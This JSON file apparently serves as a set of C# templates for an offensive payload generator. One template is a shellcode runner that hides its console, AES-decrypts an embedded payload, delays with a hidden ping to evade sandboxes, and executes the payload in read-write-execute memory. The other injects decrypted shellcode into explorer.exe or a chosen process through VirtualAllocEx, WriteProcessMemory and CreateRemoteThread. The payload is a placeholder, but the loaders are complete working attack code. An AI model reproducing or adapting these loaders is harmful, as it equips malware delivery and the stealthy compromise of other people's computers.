{
  "ShellcodeRunner": {
    "directives": [
      "using System;",
      "using System.Runtime.InteropServices;",
      "using System.Security.Cryptography;"
    ],
    "function_declarations": [
      "[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);",
      "[DllImport(\"kernel32.dll\")] static extern int GetLastError();",
      "[DllImport(\"kernel32.dll\")] static extern IntPtr GetConsoleWindow();",
      "[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);"
    ],
    "constant_declarations": [
      "const int SW_HIDE = 0;"
    ],
    "code_blocks": {
      "main": [
        "IntPtr hWnd = GetConsoleWindow();",
        "if (hWnd != IntPtr.Zero) ShowWindow(hWnd, SW_HIDE);",
        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
        "string keyB64 = \"AES_KEY_B64\";",
        "string ivB64 = \"AES_IV_B64\";",
        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
        "byte[] key = Convert.FromBase64String(keyB64);",
        "byte[] iv = Convert.FromBase64String(ivB64);",
        "byte[] shellcode = AESDecrypt(encryptedShellcode, key, iv);",
        "if (shellcode == null) { return; }"
      ],
      "delay": [
      "// --- Randomized Ping Delay ---",
      "Random rand = new Random();",
      "int lastOctet = rand.Next(1, 255);",
      "string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
      "string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
      "string IP = baseIP + lastOctet;",
      "System.Diagnostics.Process p = new System.Diagnostics.Process();",
      "p.StartInfo.FileName = \"cmd.exe\";",
      "p.StartInfo.Arguments = $\"/c ping -n 6 {IP} >nul\";",
      "p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
      "p.Start();",
      "p.WaitForExit();"
      ],
      "memory_allocation": [
        "IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);",
        "if (mem == IntPtr.Zero) { return; }"
      ],
      "copy_shellcode": [
        "Marshal.Copy(shellcode, 0, mem, shellcode.Length);"
      ],
      "execute_shellcode": [
        "IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);",
        "if (hThread == IntPtr.Zero) { return; }"
      ],
      "wait_execution": [
        "WaitForSingleObject(hThread, 0xFFFFFFFF);"
      ]
    },
    "function_definitions": [
      "static byte[] AESDecrypt(byte[] encryptedData, byte[] key, byte[] iv)",
      "{",
      "    try",
      "    {",
      "        using (Aes aesAlg = Aes.Create())",
      "        {",
      "            aesAlg.Key = key;",
      "            aesAlg.IV = iv;",
      "            aesAlg.Mode = CipherMode.CBC;",
      "            aesAlg.Padding = PaddingMode.PKCS7;",
      "            using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))",
      "            {",
      "                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);",
      "            }",
      "        }",
      "    }",
      "    catch",
      "    {",
      "        return null;",
      "    }",
      "}"
    ]
  },
  "ProcessInjection": {
    "directives": [
      "using System;",
      "using System.Runtime.InteropServices;",
      "using System.Diagnostics;",
      "using System.Security.Cryptography;",
      "using System.IO;"
    ],
    "function_declarations": [
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);",
      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
    ],
    "code_blocks": {
      "main": [
        "// --- AES Decrypted Shellcode Block ---",
        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
        "string keyB64 = \"AES_KEY_B64\";",
        "string ivB64 = \"AES_IV_B64\";",
        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
        "byte[] key = Convert.FromBase64String(keyB64);",
        "byte[] iv = Convert.FromBase64String(ivB64);",
        "byte[] buf = AESDecrypt(encryptedShellcode, key, iv);",
        "if (buf == null) {",
        "    Console.WriteLine(\"[!] AES decryption failed.\");",
        "    return;",
        "}"
        ],
        "delay": [
        "// --- Randomized Ping Delay ---",
        "Random rand = new Random();",
        "int lastOctet = rand.Next(1, 255);",
        "string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
        "string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
        "string IP = baseIP + lastOctet;",
        "System.Diagnostics.Process p = new System.Diagnostics.Process();",
        "p.StartInfo.FileName = \"cmd.exe\";",
        "p.StartInfo.Arguments = $\"/c ping -n 6 {IP} >nul\";",
        "p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
        "p.Start();",
        "p.WaitForExit();"
        ],
        "get_process": [
        "uint processId;",
        "string processName;",
        "if (args.Length < 1) {",
        "    Console.WriteLine(\"[*] No PID supplied, falling back to explorer.exe\");",
        "    Process[] processes = Process.GetProcessesByName(\"explorer\");",
        "    if (processes.Length == 0) {",
        "        Console.WriteLine(\"[!] explorer.exe not found.\");",
        "        return;",
        "    }",
        "    processId = (uint)processes[0].Id;",
        "    processName = processes[0].ProcessName;",
        "} else {",
        "    processId = uint.Parse(args[0]);",
        "    try {",
        "        Process pTarget = Process.GetProcessById((int)processId);",
        "        processName = pTarget.ProcessName;",
        "    } catch {",
        "        Console.WriteLine(\"[!] Could not get process name for given PID.\");",
        "        processName = \"Unknown\";",
        "    }",
        "}",
        "Console.WriteLine($\"[*] Shellcode Injection into: {processName} (PID: {processId})\");"
      ],
      "open_process": [
        "IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);",
        "if (hProcess == IntPtr.Zero)",
        "{",
        "    Console.WriteLine(\"[!] Failed to open process.\");",
        "    return;",
        "}",
        "Console.WriteLine($\"[+] Opened process with ID: {processId}\");"
      ],
      "memory_allocation": [
        "Console.WriteLine($\"[*] Allocating {buf.Length} bytes in remote process...\");",
        "IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);",
        "if (allocMem == IntPtr.Zero)",
        "{",
        "    Console.WriteLine(\"[!] Memory allocation failed.\");",
        "    return;",
        "}",
        "Console.WriteLine($\"[+] Allocated memory at: 0x{allocMem.ToInt64():X}\");"
      ],
      "write_memory": [
        "IntPtr bytesWritten;",
        "bool writeMem = WriteProcessMemory(hProcess, allocMem, buf, (uint)buf.Length, out bytesWritten);",
        "if (!writeMem)",
        "{",
        "    Console.WriteLine(\"[!] WriteProcessMemory failed.\");",
        "    return;",
        "}",
        "Console.WriteLine(\"[+] Shellcode written!\");"
      ],
      "execute_shellcode": [
        "Console.WriteLine(\"[*] Creating remote thread...\");",
        "IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);",
        "if (hThread == IntPtr.Zero)",
        "{",
        "    Console.WriteLine(\"[!] CreateRemoteThread failed.\");",
        "    return;",
        "}",
        "Console.WriteLine($\"[+] Remote thread created at: 0x{hThread.ToInt64():X}\");",
        "Console.WriteLine(\"[*] Injection complete.\");",
        "Console.ReadLine();"
      ]
    },
    "function_definitions": [
      "static byte[] AESDecrypt(byte[] encryptedData, byte[] key, byte[] iv)",
      "{",
      "    try",
      "    {",
      "        using (Aes aesAlg = Aes.Create())",
      "        {",
      "            aesAlg.Key = key;",
      "            aesAlg.IV = iv;",
      "            aesAlg.Mode = CipherMode.CBC;",
      "            aesAlg.Padding = PaddingMode.PKCS7;",
      "            using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))",
      "            {",
      "                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);",
      "            }",
      "        }",
      "    }",
      "    catch",
      "    {",
      "        return null;",
      "    }",
      "}"
    ]
  }
}